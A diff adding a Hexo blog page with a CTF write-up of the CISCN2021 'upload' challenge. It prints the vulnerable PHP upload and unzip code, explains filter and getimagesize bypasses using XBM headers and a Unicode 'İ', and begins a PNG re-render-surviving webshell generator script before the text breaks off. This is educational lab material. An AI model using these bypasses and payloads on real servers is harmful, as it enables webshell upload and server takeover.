@@ -1,0 +1,683 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="Hexo" href="http://odiws.github.io/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="Hexo" href="http://odiws.github.io/atom.xml" />
+<link rel="alternate" type="application/json" title="Hexo" href="http://odiws.github.io/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="buuctf,文件上传,二次渲染" />
+
+
+<link rel="canonical" href="http://odiws.github.io/2024/11/03/CISCN2021Quals-upload/">
+
+
+
+  <title>
+[CISCN2021Quals]upload - 刷题笔记 |
+zty153’s_blog = Hexo</title>
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">[CISCN2021Quals]upload
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="Created: 2024-11-03 15:31:04">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">Posted on</span>
+    <time itemprop="dateCreated datePublished" datetime="2024-11-03T15:31:04+08:00">2024-11-03</time>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="Toggle navigation bar">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">zty153’s_blog</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?854551"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?670518"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?978469"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?862345"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?574790"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?450404"></li>
+        </ul>
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">Home</a></span><i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" itemprop="item" rel="index" title="In 刷题笔记"><span itemprop="name">刷题笔记</span></a>
+<meta itemprop="position" content="1" /></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="en">
+  <link itemprop="mainEntityOfPage" href="http://odiws.github.io/2024/11/03/CISCN2021Quals-upload/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="odiws">
+    <meta itemprop="description" content=", ">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="Hexo">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <p>/ 源码：</p>
+<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">#Quals]upload </span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"ctf"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"ctf"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token variable">$ctf</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"ctf"</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ctf</span><span class="token operator">==</span><span class="token string double-quoted-string">"upload"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'postedFile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'size'</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">1024</span><span class="token operator">*</span><span class="token number">512</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"这么大个的东西你是想d我吗？"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token variable">$imageinfo</span> <span class="token operator">=</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'postedFile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#获取图片大小</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$imageinfo</span> <span class="token operator">===</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"如果不能好好传图片的话就还是不要来打扰我了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$imageinfo</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$imageinfo</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">#图片长宽为 1</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"东西不能方方正正的话就很讨厌"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token variable">$fileName</span><span class="token operator">=</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'postedFile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$fileName</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"c"</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$fileName</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"i"</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$fileName</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"h"</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$fileName</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ph"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">#过滤关键字母，忽略大小写</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"有些东西让你传上去的话那可不得了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token variable">$imagePath</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"image/"</span> <span class="token operator">.</span> <span class="token function">mb_strtolower</span><span class="token punctuation">(</span><span class="token variable">$fileName</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#使字符串小写，这边 encoding 参数被省略。</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"postedFile"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$imagePath</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">#将上传的文件移动到 image 位置下。</span></pre></td></tr><tr><td data-num="28"></td><td><pre>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"upload success, image at <span class="token interpolation"><span class="token variable">$imagePath</span></span>"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"传都没有传上去"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="32"></td><td><pre><span class="token punctuation">&#125;</span></span></pre></td></tr></table></figure><p>/example.php：</p>
+<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"ctf"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"ctf"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token variable">$ctf</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"ctf"</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ctf</span><span class="token operator">==</span><span class="token string double-quoted-string">"poc"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token variable">$zip</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>ZipArchive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token variable">$name_for_zip</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"example/"</span> <span class="token operator">.</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span><span class="token variable">$name_for_zip</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span><span class="token variable">$name_for_zip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">!==</span><span class="token string double-quoted-string">"zip"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"要不咱们再看看？"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$zip</span><span class="token operator">-></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$name_for_zip</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token keyword">die</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"都不能解压呢"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="19"></td><td><pre></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"可以解压，我想想存哪里"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token variable">$pos_for_zip</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/tmp/example/"</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token variable">$zip</span><span class="token operator">-></span><span class="token function">extractTo</span><span class="token punctuation">(</span><span class="token variable">$pos_for_zip</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token variable">$zip</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$name_for_zip</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">glob</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$pos_for_zip</span></span>/*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>            <span class="token keyword">continue</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>        <span class="token variable">$first</span> <span class="token operator">=</span> <span class="token function">imagecreatefrompng</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>        <span class="token variable">$size</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span><span class="token function">imagesx</span><span class="token punctuation">(</span><span class="token variable">$first</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">imagesy</span><span class="token punctuation">(</span><span class="token variable">$first</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>        <span class="token variable">$second</span> <span class="token operator">=</span> <span class="token function">imagecrop</span><span class="token punctuation">(</span><span class="token variable">$first</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'x'</span> <span class="token operator">=></span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'y'</span> <span class="token operator">=></span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'width'</span> <span class="token operator">=></span> <span class="token variable">$size</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'height'</span> <span class="token operator">=></span> <span class="token variable">$size</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$second</span> <span class="token operator">!==</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>            <span class="token variable">$final_name</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"basename"</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>            <span class="token function">imagepng</span><span class="token punctuation">(</span><span class="token variable">$second</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'example/'</span><span class="token operator">.</span><span class="token variable">$final_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>            <span class="token function">imagedestroy</span><span class="token punctuation">(</span><span class="token variable">$second</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>        <span class="token function">imagedestroy</span><span class="token punctuation">(</span><span class="token variable">$first</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="40"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="41"></td><td><pre></pre></td></tr><tr><td data-num="42"></td><td><pre><span class="token punctuation">&#125;</span></span></pre></td></tr></table></figure><p>绕过 imageinfo () 函数：</p>
+<pre><code>#define width 1
+#define height 1
+</code></pre>
+<p>过滤了 c,h,i，在 /example.php 里面有解压，应该是得解压，上传 zip 文件，解压之后是 php 文件就行，i 可以用 Unicode 字符代替绕过（% c4% b0 代替 i），一看到    <code>imagecreatefrompng</code>  就知道是二次渲染，</p>
+<p>第一个生成 php 脚本（生成的图片的 png 后缀改为 php，然后压缩为 zip，构造上传页面上传）：</p>
+<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token variable">$p</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">0xa3</span><span class="token punctuation">,</span> <span class="token number">0x9f</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0xf7</span><span class="token punctuation">,</span> <span class="token number">0x0e</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0x1b</span><span class="token punctuation">,</span> <span class="token number">0x23</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="3"></td><td><pre>           <span class="token number">0xbe</span><span class="token punctuation">,</span> <span class="token number">0x2c</span><span class="token punctuation">,</span> <span class="token number">0x8a</span><span class="token punctuation">,</span> <span class="token number">0xd0</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0xf9</span><span class="token punctuation">,</span> <span class="token number">0xe1</span><span class="token punctuation">,</span> <span class="token number">0xae</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="4"></td><td><pre>           <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0xf6</span><span class="token punctuation">,</span> <span class="token number">0xd9</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x5d</span><span class="token punctuation">,</span> <span class="token number">0xfb</span><span class="token punctuation">,</span> <span class="token number">0xae</span><span class="token punctuation">,</span> <span class="token number">0xcc</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="5"></td><td><pre>           <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xdc</span><span class="token punctuation">,</span> <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xdc</span><span class="token punctuation">,</span> <span class="token number">0xa3</span><span class="token punctuation">,</span> <span class="token number">0x9f</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="6"></td><td><pre>           <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0xa5</span><span class="token punctuation">,</span> <span class="token number">0xbe</span><span class="token punctuation">,</span> <span class="token number">0x5f</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x4c</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="7"></td><td><pre>           <span class="token number">0xa1</span><span class="token punctuation">,</span> <span class="token number">0x3f</span><span class="token punctuation">,</span> <span class="token number">0x7a</span><span class="token punctuation">,</span> <span class="token number">0xbf</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x6b</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0x2d</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="8"></td><td><pre>           <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x7d</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x9d</span><span class="token punctuation">,</span> <span class="token number">0xad</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0xa1</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="9"></td><td><pre>           <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token variable">$img</span> <span class="token operator">=</span> <span class="token function">imagecreatetruecolor</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$y</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$y</span> <span class="token operator">&lt;</span> <span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$y</span> <span class="token operator">+=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>   <span class="token variable">$r</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">[</span><span class="token variable">$y</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>   <span class="token variable">$g</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">[</span><span class="token variable">$y</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>   <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">[</span><span class="token variable">$y</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>   <span class="token variable">$color</span> <span class="token operator">=</span> <span class="token function">imagecolorallocate</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token variable">$r</span><span class="token punctuation">,</span> <span class="token variable">$g</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>   <span class="token function">imagesetpixel</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token 